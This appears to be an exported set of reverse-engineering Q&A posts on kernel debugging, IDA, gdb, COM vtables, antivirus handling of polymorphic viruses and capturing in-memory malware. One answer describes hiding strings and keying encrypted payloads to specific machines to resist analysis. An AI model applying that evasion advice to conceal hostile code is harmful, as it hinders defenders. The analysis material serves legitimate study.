<pre><code>C:\&gt;tlist | grep -i dbgview

3724 Dbgview.exe       DebugView on \\ (local)

C:\&gt;kd -kl -c "".foreach /pS 1 /ps 4 (place  { .shell -ci \""!handle 0 3 0n3724 Fi
le \"" grep File } ) {dt nt!_FILE_OBJECT -y Dev-&gt;Dri-&gt;DriverS place};q"" | grep -i
 +0x00c
 +0x00c DriverStart       : 0xf7451000 Void  
 +0x00c DriverStart       : 0xf73c5000 Void   
 +0x00c DriverStart       : 0xa87f9000 Void   
 +0x00c DriverStart       : 0xf7451000 Void   
 +0x00c DriverStart       : 0xf7451000 Void   

C:\&gt;kd -kl -c "".reload ; lm a (0xf7451000); lm a (0xf73c5000) ; lm a (0xa87f9000);q"" | grep -i defer

 f7451000 f746f880   ftdisk     (deferred)    
 f73c5000 f73db880   KSecDD     (deferred)    
 a87f9000 a87fcd00   Dbgv       (deferred)    


C:\&gt;kd -kl -c "".writemem  malware.sys a87f9000 a87fcfff ;q"" | grep -A 1 lkd

 lkd&gt; kd: Reading initial command '.writemem  malware.sys a87f9000 a87fcfff ;q'     
 Writing 4000 bytes........    

C:\&gt;file malware.sys  

 malware.sys; PE32 executable for MS Windows (native) Intel 80386 32-bit   
</code></pre>

<p>An explanation for the commands above as follows</p>

<pre><code>kd -kl is local kernel debugging

!handle command has the capability to search for kernel handle  
when you input a Pid 

The explanation for arguments for this commands are 

 0 = all handles 
 3 = default flag provides basic+object information
 0n3724 = pid (can be from task manager
 File = type of Object to search for 


!dt can display memebers of nested structures with ease 
-y with dt takes partial inputs (wild card entries ) 
 and displays  all matching structure members 

and the output is manipulatable with any text / stream handling 
software like grep , sed . awk . find etc
</code></pre>
","3965"
"Printing Unicode strings in Gdb in OSX","2219","","<p>Are there any useful snippets or Gdb functions that you guys normally use to print out Unicode strings? I'm trying to debug Mach-O binaries and <code>x/s</code> seems to be printing out junk. I believe the default encoding for Objective C strings is UTF-16.</p>
","<p>If you think the encoding is wrong then you can try these 2 things:</p>

<ul>
<li>Try using <code>x/hs</code> <a href=""http://sourceware.org/gdb/onlinedocs/gdb/Memory.html"">as described here</a></li>
</ul>

<blockquote>
  <p>Each time you specify a unit size with x, that size becomes the default unit the next time you use x
  ...
  Use x /hs to display 16-bit char strings</p>
</blockquote>

<ul>
<li>set the character set in gdb <a href=""http://sourceware.org/gdb/onlinedocs/gdb/Character-Sets.html"">as described here</a></li>
</ul>

<blockquote>
  <p>gdb has no way to automatically recognize which character set the inferior program uses; you must tell it, using the set target-charset command, described below.</p>
</blockquote>
","1861"
"How do I view external function calls in dynamically linked ELF binary in linux?","2211","","<p>I used the <code>file</code> command in Linux to get information about a binary file. I am also looking for the addresses that these calls are located at. I think I can get this information from GDB or <code>objdump</code> but I am not very good with Linux commands and programs yet so any help is much appreciated. The output from the file command is below:</p>

<pre><code>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x6d232dd468b2344847a4b9c81eb064ffe257d5d0, stripped
</code></pre>

<p>Then using the <code>strings</code> command I got this output (I see several C function calls but which are external ?):</p>

<pre><code>/lib/ld-linux.so.2
-#mH4
__gmon_start__
libc.so.6
_IO_stdin_used
exit
strncmp
strncpy
puts
printf
malloc
atoi
__libc_start_main
GLIBC_2.0
PTRh
QVh&gt;
UWVS
[^_]
testing
strncmp: %s;
atoi
Complete
;*2$""
</code></pre>
","<p>use nm instead of strings. Undefined symbols (indicated by a <code>U</code>) will be resolved externally (by the <code>libc</code> or whatever), and <code>T</code> (or <code>t</code>) symbols are locally defined. Lowercase indicates a local symbol, uppercase a global symbol.</p>

<p>Of course, this assumes there's a symbol table present. In your example, it's been stripped.</p>

<p>In that case, you can do <code>objdump -T</code> file to list the external references.</p>
","4151"
"How to get imge base of current setting through script in IDA pro？","2204","","<p>As a beginner I'm trying to disassemble a file with IDA Pro 6.5. 
I know that the image base can be find in IDA Pro manu Edit -> Segment -> Rebase program.</p>

<p>Now, I want to get the image base of current setting through IDC or IDAPython. Are there anyone to tell me how to write script? </p>

<p>Thanks in advance.</p>
","<p><code>idaapi.get_imagebase()</code> is your friend.</p>

<p>Just in case you didn't know, all the reference documentation for idapython is <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"">here</a></p>

<p>Example:</p>

<pre><code>Python&gt;hex(idaapi.get_imagebase())
0x100000L
</code></pre>
","8489"
"Encrypting text in binary files","2202","","<p>Text strings are usually easily read in a binary file using any editor that supports ASCII encoding of hexadecimal values. These text snippets can be easily studied and altered by a reverse engineer.</p>

<p>What options does a developer have to encrypt these text snippets, and decrypt them, in runtime ?</p>
","<p>Some options which may or may not be applicable depending on your needs:</p>

<ol>
<li><p><strong>Avoid</strong> using strings to leak out interesting information when possible. For example if you are using strings to display error information or logging information, this can give any reverse engineer valuable details as to what might be going on in your application. Instead replace these strings with numerical error codes.</p></li>
<li><p><strong>Obfuscate</strong> all strings with some kind of symmetric algorithm like a simple XOR routine, or a crypto algorithm like AES. This will prevent the string from being discovered during a casual examination of your binary. I say 'obfuscate' as you will presumably be storing the crypto/xor key in your binary. Any reverse engineer who tries a little harder will surely recover the obfuscated strings.</p></li>
<li><p><strong>Encrypt</strong> all strings (make all the strings get linked into a separate section in your executable and encrypt this section) and store the decryption key outside of your binary. You could store the key remotely and restrict access server side where possible. So if a reverse engineer does get your binary they <em>may</em> not be able to access the key. The decryption key could also be generated dynamically on the users computer based off several predictable factors known about that users machine, essentially only allowing the encrypted data to be decrypted when run on this specific machine (or type of machine). This technique has been used by government malware to encrypt payloads for specific targets (If I can remember the link to the paper I read this in I will update answer).</p></li>
<li><p><strong>Get Creative</strong>, Store all strings in a foreign language and then at run time use an online translation service to translate the string back to your expected native language. This is of course not very practical.</p></li>
</ol>

<p>Of course if your strings do get decoded/decrypted at run time then a reverse engineer could just dump the process from memory in order to see the strings. For this reason it may be best to decode/decrypt individual strings only when needed (possibly storing the decoded string in a temporary location and zeroing it after use).</p>
","1357"
"COM interface methods","2193","","<p>I'm reversing malware and it uses COM, which I evidently don't know. My question is how to find out what method is called using ppv(and objectstublessclient?)</p>

<pre><code>push    offset ppv      ; Address of pointer variable that receives the interface pointer requested in riid
push    offset IShellWindows 
push    7              
push    0               
push    offset rclsid   
call    ds:_CoCreateInstance

mov     ebx, eax
mov     eax, num4
movsx   edx, num8
add     eax, edx
sub     eax, 0Ch
cmp     ebx, eax        ; S_OK, operation successful
jnz     exit

lea     eax, [ebp+var_C]    ;?
push    eax
mov     eax, ppv
push    eax
mov     edi, [eax]
call    dword ptr [edi+1Ch] ; ObjectStublessClient7
</code></pre>

<p>I guessed that the last called function is objectStublessClient7 given that there are three methods(queryinterface etc) and then objectStublessClient's (and code looks like it). <em>(Is that right?)</em></p>

<p><a href=""http://www.microsoft.com/msj/0199/com/com0199.aspx"">Here</a> it says:</p>

<blockquote>
  <p>ObjectStubless simply calls into ObjectStublessClient, passing the method index (from ecx) as a parameter. Finally, ObjectStublessClient teases out the format strings from the vtable and jumps to NdrClientCall2. Like NdrStubCall2, this RPCRT4.DLL routine performs the interpretive marshaling and unmarshaling just as if a compiled proxy and stub were in use. </p>
</blockquote>

<p>What does ObjectStublessClient actually do in simple words? Calls a method by its index? If so, then in my case it will be OnActivate of <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/cc836570%28v=vs.85%29.aspx"">IShellWindows</a>? It looks like the arguments don't match (does the first one look like <code>this</code>?)</p>
","<h2>The <em>traditional</em> way to determine the function pointed to by <code>[edi+1Ch]</code> is as follows:</h2>

<p>Find the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa378712%28v=vs.85%29.aspx"" rel=""noreferrer"">Interface Definition Language (IDL)</a> file for the given interface. In your case, the interface is <code>IShellWindows</code>. According to the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/cc836570%28v=vs.85%29.aspx"" rel=""noreferrer"">documentation for <code>IShellWindows</code></a>, its interface is defined in IDL file <code>Exdisp.idl</code>. That IDL file is included in the <a href=""http://en.wikipedia.org/wiki/Microsoft_Windows_SDK"" rel=""noreferrer"">Windows SDK</a> (downloadable for free), and will be installed to a location such as <code>C:\Program Files\Microsoft SDKs\Windows\v7.1A\Include\Exdisp.idl</code>. You can open that <code>Exdisp.idl</code> file with a text editor to see the Interface Definition of <code>IShellWindows</code>:</p>

<pre><code>[
    uuid(85CB6900-4D95-11CF-960C-0080C7F4EE85),     // IID_IShellWindows
    helpstring(""Definition of interface IShellWindows""),
    oleautomation,
    dual,
    odl,
]
interface IShellWindows : IDispatch
{
    //Properties
    [propget, helpstring(""Get count of open Shell windows"")]
    HRESULT Count([out, retval] long *Count);

    //Methods
    [id(0), helpstring(""Return the shell window for the given index"")]
    HRESULT Item([in,optional] VARIANT index, [out, retval]IDispatch **Folder);

    [id(-4), helpstring(""Enumerates the figures"")]
    HRESULT _NewEnum([out, retval] IUnknown **ppunk);

    // Some private hidden members to allow shell windows to add and
    // remove themself from the list.  We mark them hidden to keep
    // random VB apps from trying to Register...
    [helpstring(""Register a window with the list""), hidden]
    HRESULT Register([in] IDispatch *pid,
                     [in] long hwnd,
                     [in] int swClass,
                     [out]long *plCookie);

    [helpstring(""Register a pending open with the list""), hidden]
    HRESULT RegisterPending([in] long lThreadId,
                     [in] VARIANT* pvarloc,     // will hold pidl that is being opened.
                     [in] VARIANT* pvarlocRoot, // Optional root pidl
                     [in] int swClass,
                     [out]long *plCookie);

    [helpstring(""Remove a window from the list""), hidden]
    HRESULT Revoke([in]long lCookie);
    // As an optimization, each window notifies the new location
    // only when
    //  (1) it's being deactivated
    //  (2) getFullName is called (we overload it to force update)
    [helpstring(""Notifies the new location""), hidden]
    HRESULT OnNavigate([in]long lCookie, [in] VARIANT* pvarLoc);
    [helpstring(""Notifies the activation""), hidden]
    HRESULT OnActivated([in]long lCookie, [in] VARIANT_BOOL fActive);
    [helpstring(""Find the window based on the location""), hidden]
    HRESULT FindWindowSW([in] VARIANT* pvarLoc,
                         [in] VARIANT* pvarLocRoot, /* unused */
                         [in] int swClass,
                         [out] long * phwnd,
                         [in] int swfwOptions,
                         [out,retval] IDispatch** ppdispOut);
    [helpstring(""Notifies on creation and frame name set""), hidden]
    HRESULT OnCreated([in]long lCookie,[in] IUnknown *punk);

    [helpstring(""Used by IExplore to register different processes""), hidden]
    HRESULT ProcessAttachDetach([in] VARIANT_BOOL fAttach);
}
</code></pre>

<p>We can see that the <code>IShellWindows</code> interface has the following <a href=""http://en.wikipedia.org/wiki/Virtual_method_table"" rel=""noreferrer"">vtable</a> entries:</p>

<pre><code>- Count()
- Item()
- _NewEnum()
- Register()
- RegisterPending()
- Revoke()
- OnNavigate()
- OnActivated()
- FindWindowSW()
- OnCreated()
- ProcessAttachDetach()
</code></pre>

<p>However, you can also see in the IDL that the <code>IShellWindows</code> interface inherits from <code>IDispatch</code>. <code>IDispatch</code> has the following vtable entries (from <code>OAIdl.idl</code>):</p>

<pre><code>- GetTypeInfoCount()
- GetTypeInfo()
- GetIDsOfNames()
- Invoke()
</code></pre>

<p>The IDL for <code>IDispatch</code> in <code>OAIdl.idl</code> also specifies that <code>IDispatch</code> inherits from <code>IUnknown</code>. <code>IUnknown</code> has the following vtable entries (from <code>Unknwn.idl</code>):</p>

<pre><code>- QueryInterface()
- AddRef()
- Release()
</code></pre>

<p>So now we know that <code>IShellWindows</code> inherits from <code>IDispatch</code>, which inherits from <code>IUnknown</code>. As such, the full layout of the vtable for <code>IShellWindows</code> is as follows:</p>

<pre><code>*ppv+00h = QueryInterface()
*ppv+04h = AddRef()
*ppv+08h = Release()
*ppv+0Ch = GetTypeInfoCount()
*ppv+10h = GetTypeInfo()
*ppv+14h = GetIDsOfNames()
*ppv+18h = Invoke()
*ppv+1Ch = Count()
*ppv+20h = Item()
*ppv+24h = _NewEnum()
*ppv+28h = Register()
...
</code></pre>

<p>Looking back at your code, we see a call to <code>*ppv+1Ch</code>, which we see from our constructed vtable above is a call to the function <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/cc836569%28v=vs.85%29.aspx"" rel=""noreferrer""><code>IShellWindows::Count()</code></a>, and <code>&amp;var_C</code> is the pointer to <code>IShellWindows::Count()</code>'s <code>[out, retval]  long *Count</code> parameter.</p>

<hr>

<h2>The <em>dynamic</em> way to determine the function pointed to by <code>[edi+1Ch]</code> is as follows:</h2>

<p>Run your code above in a debugger, set a breakpoint on <code>call    dword ptr [edi+1Ch]</code>, and see what function that instruction calls.</p>

<hr>

<h2>The <em>easiest</em> way to determine the function pointed to by <code>[edi+1Ch]</code> is as follows:</h2>

<p>Use <a href=""http://www.japheth.de/COMView.html"" rel=""noreferrer"">COMView</a> to inspect the <code>IShellWindows</code> interface:</p>

<p><img src=""https://i.stack.imgur.com/KCaYn.png"" alt=""&lt;code&gt;IShellWindows&lt;/code&gt; vtable in COMView""></p>

<p>You can see in the screenshot above that the function at vtable offset 28 (1Ch) is <code>Count()</code>.</p>
","2823"
"When defining a structure in IDA, can I define a field that is of another struct type?","2193","","<p>I'm looking to define a structure in IDA like:</p>

<pre><code>struct StructA {
    int a;
    int b;
} StructA;

struct StructB {
    StructA a;
    int b;
} StructB;
</code></pre>

<p>Can I do this in IDA's structure definition box without having to redefine all the members from <code>StructA</code> in <code>StructB</code>?</p>
","<p>Yes. In <code>StructB</code>, select the field you want to convert to a sub-structure or create a new field by pressing <kbd>D</kbd>. With the given field selected, press <kbd>Alt</kbd>+<kbd>Q</kbd> and select <code>StructA</code> for the field.</p>
","3860"
"Wanted: Java bytecode disassembler that shows addresses, opcodes, operands, in hex","2191","","<p>I am after a java bytecode disassembler whose output includes the bytecodes themselves, their operands, and their addresses in the .class file, and which displays numbers in hex, not decimal.</p>

<p>To show what I mean, here are a few lines taken from the output of javap:</p>

<pre><code>private java.text.SimpleDateFormat createTimeFormat();
  Code:
   Stack=3, Locals=2, Args_size=1
   0:    new    #84; //class java/text/SimpleDateFormat
   3:    dup
   4:    ldc    #17; //String yyyy-MM-dd'T'HH:mm:ss
   6:    invokespecial    #87; //Method java/text/SimpleDateFormat.""&lt;init&gt;"":(Ljava/lang/String;)V
   9:    astore_1
</code></pre>

<p>Every java bytecode disassembler I have found (I have spent much time on google, and downloaded several different ones to try) produces output which is essentially the same as this. Some format or decorate it slightly differently; some replace the command line interface with a fancy GUI; but not one of them displays the addresses of the instructions in the .class file, nor the bytecodes themselves - there are several which <em>claim</em> to show the bytecodes, but none of them actually do, they display only the textual mnemonics representing the bytecodes rather than the bytecodes themselves. Also, they all display the numerical information in decimal, not in hex.</p>

<p>Here is an edited version of the above output which I have transformed by hand to produce an example of the sort of thing I am looking for:</p>

<pre><code>private java.text.SimpleDateFormat createTimeFormat();
  Code:
   Stack=3, Locals=2, Args_size=1
000010cf    0:    bb 00 54    new    #54; //class java/text/SimpleDateFormat
000010d2    3:    59          dup
000010d3    4:    12 11       ldc    #11; //String yyyy-MM-dd'T'HH:mm:ss
000010d5    6:    b7 00 57    invokespecial    #57; //Method java/text/SimpleDateFormat.""&lt;init&gt;"":(Ljava/lang/String;)V
000010d8    9:    4c          astore_1
</code></pre>

<p>The addresses at the start of the lines correspond to the position of the instructions in the .class file, as one would find in a plain hexdump. The hex representations of the bytecodes and their operands are shown, and the disassembly shows the constants in hex.</p>

<p>Is there anything available which would produce output resembling this? It does not matter if the fields are in a different order, as long as they are all there. It must run on Linux, either natively or under java.</p>
","<p>Maybe <a href=""http://radare.org"" rel=""noreferrer"">radare2</a> is what you're looking for. See this screenshot:</p>

<p><img src=""https://i.stack.imgur.com/S5thj.png"" alt=""radare2 decompiling java bytecode""></p>
","2037"
"How do AV vendors create signatures for polymorphic viruses?","2186","","<p>I was working on a hobby AV project using ClamAV's engine. While ClamAV is a good open source engine, it has poor support for detecting polymorphic viruses. The latest updated version failed to detect many instances of Virut and Sality. How do commercial AVs detect polymorphic viruses?</p>
","<p>To detect the polymorphic engine itself - properly - requires a copy of the engine.  That was the case in the past, since the virus carried the engine in order to produce new copies of itself.  The obvious attack against that is server-side polymorphism, where we (""we""=the AV industry) are left to guess at the capabilities of the engine, and which can change at any time, in response to our detections.
However, back to the actual question:
given an engine that can produce a sequence like this:</p>

<pre><code>mov reg1, offset_of_crypted

[optional garbage from set 1]
[optional garbage from set 2]
[optional garbage from set 3]

mov reg2, key_for_crypted

[optional garbage from set 1]
[optional garbage from set 2]
[optional garbage from set 3]

mov reg3, size_of_crypted

[optional garbage from set 1]
[optional garbage from set 2]
[optional garbage from set 3]

[decrypt]

[optional garbage from set 1]
[optional garbage from set 2]
[optional garbage from set 3]

[adjust reg3]

[optional garbage from set 1]
[optional garbage from set 2]
[optional garbage from set 3]

[branch to decrypt until reg3 completes]
</code></pre>

<p>then we can analyse the opcodes that can produce the register assignments, and we know the set of garbage instructions, the decryption methods, the register adjustment, etc.</p>

<p>From there, we can use a state machine to watch for the real instructions, and ignore the fake ones.  The implementation details of that are long and boring, and not suitable as an answer here.
It's a one-engine one-algorithm relationship, in most cases.</p>

<p>As a result, the emulator became the most useful tool that we have against that attack, allowing us to essentially ""let the virus decrypt itself"" and then we can see what's underneath (the attack against that is obviously metamorphism, and the simplest implementation is at the source level rather than post-compilation).</p>

<p>So, in short, the answer is generally ""we don't anymore"".  That is, we tend to no longer detect the polymorphic engine itself.  There are of course exceptions to that, but they are few and far between these days.</p>
","2189"
"Where the pointer to virtual function table is located?","2179","","<p>I used to think that the pointer to the Virtual Function Table (VFT, also Virtual Method Table, VMT) is the very first 32-bit word of the object binary representation.</p>

<p>But now I see a VFT whose index is 13 (!!!!), that is, offset=0x34. (I write ""index"" because the code to invoke the Qt function <code>o.metaObject()</code> is <code>((func***)o)[13][0](o)</code>). OMG, what is going on? Why the VFT address is located... where?</p>

<p>EDIT (after complaints that the question is unclear):</p>

<p>Each object with virtual functions has a pointer to the Virtual Function Table. Usually, this is the very first 32-bit value in the object's binary representation (and may be accessed as <code>((void**)objAddr)[0]</code>). But in the example below the offset of VMT pointer is not 0! (Function names may be demangled by <a href=""http://linux.die.net/man/1/c++filt"" rel=""nofollow""><code>c++filt</code></a>; for readability, the class names have been shortened to <code>Abc</code> and <code>Xyz</code>):</p>

<pre><code>.text:02EF171C _ZN3XyzC2EP7QObject ; constructor Xyz::Xyz(QObject*), r0 = objAddr, r1 = QObject addr
.text:02EF171C                 PUSH.W          {R4-R8,LR}
.text:02EF1720                 MOV             R4, R0
.text:02EF1722                 LDR             R5, =(_GLOBAL_OFFSET_TABLE_ - 0x02EF1730)
.text:02EF1724                 MOV             R7, R1
.text:02EF1726                 BL.W            _ZN4AbcdC2EP7QObject ; superclass_constructor(objAddr)
.text:02EF172A ; ---------------------------------------------------------------------------
.text:02EF172A                 LDR             R3, =(_ZTVN3XyzE_ptr - 0x27E4BE0) ; vtable for Xyz
.text:02EF172C                 ADD             R5, PC ; _GLOBAL_OFFSET_TABLE_
.text:02EF172E                 MOV             R6, R4
.text:02EF1730                 MOV             R1, R7
.text:02EF1732                 LDR             R3, [R5,R3] ; _ZTVN3XyzE_ptr ; pointer to vtable for Xyz
.text:02EF1734                 ADDS            R3, #8 ; *_ptr points to the (-2)nd element of VMT
.text:02EF1736                 STR.W           R3, [R6],#0x34 ; OOPS! the offset is 0x34 !!!
</code></pre>

<p><em>I want to be able to locate the pointer to VMT for any object,</em> but as the example above shows, the pointer to VMT is not necessarily <code>((void**)objAddr)[0]</code>.</p>

<p>So the question is:</p>

<p>1) <strong><em>why the VMT pointer is in the middle of the object's binary representation?</em></strong> There must be something specific about this place.</p>

<p>2) <strong><em>how do I find out where the VMT pointer actually is?</em></strong> (Ideally, at run-time given the object address. I have the code to tell a valid address from an invalid one. I'm interested in GCC for Android/ARM, although techniques for different platforms may turn out to be applicable.)</p>

<p>PS the code to detect a valid address on Android is:</p>

<pre><code>#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
int isValidPtr(const void*p, int len) {
    if (!p) { return 0; }
    int ret = 1;
    int nullfd = open(""/dev/random"", O_WRONLY); // does not work with /dev/null !!!
    if (write(nullfd, p, len) &lt; 0) {
        ret = 0; /* Not OK */
    }
    close(nullfd);
    return ret;
}
</code></pre>

<p>UPDATE</p>

<p>In the following example, the VMT offset is 0:</p>

<pre><code>class Base {
public:
  int x,y;
};
class Derived: public Base {
public:
  int z;
  Derived();
  virtual int func();
  virtual int func2();
};
</code></pre>

<p>Coercion from <code>Base*</code> to <code>Derived*</code> compiles to: <code>SUBS R0, #4</code></p>

<pre><code>int test3(Base*b) {
    Derived*d = (Derived*)b;
    int r = addDerived(*d);
    return r;
}

 ; test3(Base *)
 _Z5test3P4Base
 CBZ             R0, loc_1C7A
 SUBS            R0, #4
 B.W             _Z10addDerivedR7Derived ;
</code></pre>

<p>UPDATE2</p>

<p>I tried</p>

<pre><code>struct Cls2 {
    unsigned x[13];
    Derived d;
    Cls2();
};
</code></pre>

<p>and here's the disassembly:</p>

<pre><code>.text:00001CE2 _ZN4Cls2C2Ev ; Cls2::Cls2(void)
.text:00001CE2                 PUSH            {R4,LR}
.text:00001CE4                 MOV             R4, R0
.text:00001CE6                 ADD.W           R0, R0, #0x34
.text:00001CEA                 BL              _ZN7DerivedC2Ev ; Derived::Derived(void)
.text:00001CEE                 MOV             R0, R4
.text:00001CF0                 POP             {R4,PC}
</code></pre>

<p>That is, the VFT pointer of <code>Cls2::d</code> will indeed be at offset 0x34, but there's no <code>STR.W R3,[R6],#0x34</code>, so it is not #2 suggested by Willem Hengeveld.</p>

<p>BUT if we comment out the constructor,</p>

<pre><code>struct Cls2 {
    unsigned x[13];
    Derived d;
//    Cls2();
};
</code></pre>

<p>in</p>

<pre><code>int testCls2() {
    Cls2 c;
    return c.d.func2();
}
</code></pre>

<p>we get</p>

<pre><code>.text:00001C9E _Z8testCls2v
.text:00001C9E var_18          = -0x18
.text:00001C9E                 PUSH            {LR}
.text:00001CA0                 SUB             SP, SP, #0x4C
.text:00001CA2                 ADD             R0, SP, #0x50+var_18
.text:00001CA4                 BL              _ZN7DerivedC2Ev ; Derived::Derived(void)
.text:00001CA8                 ADD             R0, SP, #0x50+var_18
.text:00001CAA                 BL              _ZN7Derived5func2Ev ; Derived::func2(void)
.text:00001CAE                 ADD             SP, SP, #0x4C
.text:00001CB0                 POP             {PC}
</code></pre>

<p>which is very similar to the original code
BUT in my case the VMT <code>vtable for Xyz</code> is written from <code>Xyz::Xyz()</code> and not from the enclosing function.</p>
","<p>I can think of 2 cases where a VMT is not in the first word of an object:</p>

<ul>
<li>using multiple inheritance</li>
<li>when the an object has a member variable which has virtual methods</li>
</ul>

<h2>multiple inheritance</h2>

<pre><code>struct base1 {
    uint32_t x[12];
    virtual void m1() { }
};


struct base2 {
    virtual void m2() { }
};

struct cls : base1, base2 {
};
</code></pre>

<p>now the VMT of base2 is at offset 0x34</p>

<h2>virtual member</h2>

<pre><code>struct cls2 {
    uint32_t x[13];
    base2   b;
};
</code></pre>

<p>now also the VMT of base2 is at offset 0x34</p>
","4451"
"How to print from pointers in radare2 in debug session","2174","","<p>when I am using the radare2 debugger, it happens that I have sometimes to examine variables and memory. Consider the following instruction</p>

<pre><code>0x08048498      8b4508         mov eax, dword [ebp+arg2]
</code></pre>

<p>Assuming that I know that what in eax pointer to array of characters with null termination at the end (I mean string). So, <code>ebp+arg2</code> is pointer to that string.</p>

<p>when I type <code>ps @eax</code> I get what I expect, a string. But, I can get the same result by accessing <code>[ebp+arg_2]</code>. I tried many things including <code>ps</code> and <code>ps/</code> etc.</p>
","<p>Check out the <code>afa</code> command (<code>a</code> for analysis, <code>f</code> for function, and the latest <code>a</code> for arguments), you should find the value of the args.</p>

<p>You can then use <code>pxr</code> (<code>p</code> as in <code>print</code>, <code>x</code> and in hexdump, <code>r</code> as in reference): <code>pxr 1 @ ebp+0x8</code>, <code>1</code> to get the first reference.</p>
","11772"
"How do i use IDA for heap search for specific types and values?","2164","","<p>How do i use IDA debugger to find some specific values in process memory, like values of float or integer, or string type?</p>

<p>Then how can i trace how program accesses them?</p>
","<p>Question 1:
You may use the Ida feature Menu Search, Sequence of Bytes...</p>

<p>In case you  are e.g. looking for a float value, convert that float into a sequence of four bytes and let Ida search for it. The conversion can be done in Ida as well (IIRC), or in any other hex editor allowing to display different data types. Of course, if your variable is a double instead of a float you need the proper byte sequence for a double which is different. 
When searching for a string, you may use the same method. Of course here also you must know e.g. whether you are looking for an ascii string or another kind of string like unicode.
With that method, the endian-ness must be observed, because the byte sequence may be different with Big-Endian or Little-Endian.</p>

<p>Question 2:</p>

<p>In case you found your memory address, put a breakpoint on it. In a memory region, a window opens where you may edit your breakpoint, e.g. select break or trace, as well as the condition when to break and other items. A breakpoint in a code region may be edited by first putting the breakpoint on the location with F2, and then selecting ""Edit Breakpoint"" with a right mouse click.</p>
","9346"
"How to capture an ""in-memory"" malware in MS-Windows?","2157","","<p>I have an infected MS-Windows 7 machine with an <em>in-memory</em> malware, shutting it down will probably make it disappear and I would like to get the malware in a more convenient format to perform some analysis on it.</p>

<p>What are the different in-memory malware and what kind of methods do you recommend for each type of in-memory malware ?</p>
","<p>You should proceed in two steps: </p>

<p><strong>First:</strong> You need to have a look on <a href=""http://www.moonsols.com/products/"">MoonSols Windows Memory Toolkit Community Edition</a>.  It will allow You to dump memory to file for further analysis</p>

<p><strong>Second:</strong> then You'll need <a href=""https://www.volatilesystems.com/default/volatility"">Volatility Toolkit</a> to analyze dump file and extract info, binaries, DLLs and more from there. </p>

<p><strong>For great sample</strong>: of using Volatility - have a look on Andre DiMino's blog post about <a href=""http://sempersecurus.blogspot.co.il/2012/08/cridex-analysis-using-volatility.html""><strong>Cridex</strong></a></p>
","1762"
"Structure Definitions for PEB in IDA","2156","","<p>When reversing shellcode, we see the PEB walk fairly often at various stages. I am curious however, if there is any pre-defined standard structure for this in IDA? If so, what is it called? After looking and googling around I haven't been able to find anything. I would also be very interested in definitions for PEB_LDR_DATA and RTL_USER_PROCESS_PARAMETERS.</p>

<p>I could create them myself and export them somehow (would have to figure out how). But before doing that I am really curious if there is just something I am missing amongst the standard structure definitions in IDA.</p>
","<p>The structures for the PEB are <strong>_PEB</strong> and <strong>PEB_LDR_DATA</strong>. You need to have the <strong>ntapi</strong> type library loaded, you can add it by going in the <strong>Type Libraries</strong> view (<kbd>Shift</kbd>+<kbd>F11</kbd>) and then press <kbd>Ins</kbd>.</p>
","2612"
"How to debug a NSIS installer in order to find where the compressed data is?","2152","","<p>NISIS installers compress data using <code>bizp2</code>, <code>lzma</code> or <code>zlib</code> -- I don't know if there are others algorithms--.</p>

<p>At some point in the installation process one of those algorithms has to be applied to certain buffer of data. Of course, that data was readed from the disk --contained into the installer--. </p>

<p>How can I debug a NISIS installer in order to know where the installer files are? What I have to look for?</p>

<p>Note: I can work with OllyDbg or IDAPro.</p>
","<p>Generally speaking, you can either detect when the data is read from the file (by monitoring functions as <code>ReadFile</code>), or when it's being decompressed (by monitoring the decompression function once you find it). In some cases the program may read the compressed data directly and pass it to the decompression function, but in others it could read some chunk of file together with the header/metadata, parse that header, and then pass only the trailing compressed data to the decompressor. There is no single ""right way"" to figure out where exactly the compressed data is in the file.</p>

<p>That said, NSIS is open-source and you can just look <a href=""http://nsis.sourceforge.net/Development_Files"">at the source code</a> to see how it works. There are also <a href=""http://nsis.sourceforge.net/Can_I_decompile_an_existing_installer"">ready-made tools</a> to extract files from NSIS installers.</p>
","6464"
"How to switch to ""Graph View"" in IDA Pro while debugging with WinDbg inside a system DLL?","2143","","<p>While debugging inside a loaded <code>exe</code> process (using <code>IDA Pro</code> as a disassembler, and <code>WinDbg</code> as a debugger) I can right click the code view and select <code>Graph view</code>:</p>

<p><a href=""https://i.stack.imgur.com/IC3DL.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/IC3DL.png"" alt=""enter image description here""></a></p>

<p>That will switch it to this nice code-flow view that is much easier to read:</p>

<p><a href=""https://i.stack.imgur.com/ESTGC.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ESTGC.png"" alt=""enter image description here""></a></p>

<p>But if I step into a system DLL (in this case <code>mshtml.dll</code>) I can't seem to get that same <code>Graph view</code> command, and instead I get this generic view:</p>

<p><a href=""https://i.stack.imgur.com/HIJDJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HIJDJ.png"" alt=""enter image description here""></a></p>

<p>So I was wondering, if there's a way to enable <code>Graph view</code> for a system DLL as well?</p>
","<p>IDA can only display functions in graph mode, so in order to see that code as a graph, you must:</p>

<h3>Find the start of the function</h3>

<p>Search for a prologue, such as <code>push ebp</code>, <code>mov ebp, esp</code><sup>1</sup>, and find the start of the function. If it gets hard, you can always load debug symbols<sup>2</sup> and find the start like that.</p>

<p>1: Actually, most Microsoft DLLs are compiled with the hotpatch option, which means that the prologue is prefixed with <code>mov edi, edi</code> (<a href=""https://blogs.msdn.microsoft.com/oldnewthing/20110921-00/?p=9583"" rel=""nofollow noreferrer"">here's why</a>), so searching for that instruction should be very easy.</p>

<p>2: In the WinDbg command line, write <code>.symfix</code> to fix the symbols path and <code>.reload /f mshtml.dll</code> to reload the symbols for that module. Alternatively, go to <code>Debugger</code> -> <code>Debugger windows</code> -> <code>Modules list</code>, find <code>mshtml.dll</code> in the window, right-click it and choose ""Load debug symbols"". Then, simply use the <code>Functions</code> window or the status bar to find the start of the function.</p>

<h3>Make it a function</h3>

<p>Put the cursor at the start, and press <kbd>P</kbd>. Now press <kbd>Space</kbd> and you'll be in graph mode!</p>
","14281"
